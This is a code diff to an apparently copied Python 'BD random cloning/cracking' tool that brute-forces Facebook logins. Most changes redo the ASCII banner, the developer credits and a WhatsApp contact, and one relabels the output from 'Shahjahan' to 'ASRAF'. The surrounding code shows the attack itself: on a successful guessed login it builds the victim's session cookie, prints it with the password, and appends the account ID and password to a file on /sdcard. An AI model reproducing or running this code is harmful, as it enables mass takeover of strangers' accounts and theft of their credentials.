@@ -130,17 +130,17 @@ logo=("""
  /_/    \_\_____/|_|  \_\/_/    \_\_|      /_/ \_\_____/ 
                                                                                                                               
 \33[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗               
-║  \x1b[97m\033[37;41m Welcome to my ASRAF Tools                          \033[0;m  ║
+║  \x1b[97m\033[37;41m Welcome to my ASRAF Tools                         \033[0;m  ║
 \33[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝                      
 \33[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗               
 ║  \x1b[97m\033[37;41m  FREE BANGLADESHI RANDOM CLONING V1 \033[0;m    ║
 \33[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝            
 \33[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
-\33[1;92m║➣\033[1;91m DEVOLPER   :          ASRAF \33[1;92m║               
-\33[1;92m║➣ FACEBOOK   :          ASRAF AHMED \33[1;92m║                 
-\33[1;92m║➣\033[1;93m WHATSAPP   :          01858029266        \33[1;92m ║
-\33[1;92m║➣\033[1;34m GITHUB     :          Asrafxd17         \33[1;92m ║          
-\33[1;92m║➣\033[1;35m TOOLS      :          BD RANDOM CRACKING \33[1;92m ║                 
+\33[1;92m║➣\033[1;91m DEVOLPER   :          ASRAF \33[1;92m                        ║               
+\33[1;92m║➣ FACEBOOK   :          ASRAF AHMED \33[1;92m                            ║                 
+\33[1;92m║➣\033[1;93m WHATSAPP   :          01858029266        \33[1;92m           ║
+\33[1;92m║➣\033[1;34m GITHUB     :          Asrafxd17         \33[1;92m            ║          
+\33[1;92m║➣\033[1;35m TOOLS      :          BD RANDOM CRACKING \33[1;92m           ║                 
 \33[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
 """)
 def cek_apk(session,coki):
@@ -284,7 +284,7 @@ def b(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print(f'\r\33[1;92m [Shahjahan-💚] '+cid+' | '+ps+'\33[0;92m')
+                print(f'\r\33[1;92m [ASRAF-💚] '+cid+' | '+ps+'\33[0;92m')
                 print(f'\r\033[1;92m=[💙]=COOKIE : '+coki)
                 oks.append(cid)
                 open('/sdcard/ASRAF-OK💥.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
